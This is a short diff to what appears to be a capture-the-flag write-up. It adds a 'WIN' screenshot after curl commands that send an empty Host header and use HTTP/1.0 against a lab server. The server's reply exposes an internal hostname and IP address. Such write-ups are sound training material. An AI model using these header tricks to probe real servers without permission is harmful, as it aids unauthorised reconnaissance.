@@ -86,4 +86,5 @@ curl -H "Host:" http://94.237.48.147:49291/think
 curl -H "Host:" --http1.0 http://94.237.48.147:49291/think
 {"host":"alley.firstalleyontheleft.com","x-real-ip":"10.30.18.144","x-forwarded-for":"10.30.18.144","x-forwarded-proto":"http","connection":"close","user-agent":"curl/8.5.0","accept":"*/*"}(base)
 ```
-- N'id win
+**WIN** <img width="1077" height="800" alt="image" src="https://github.com/user-attachments/assets/c217ea43-8d21-44d9-bd0d-efdcf9d69f46" />
+
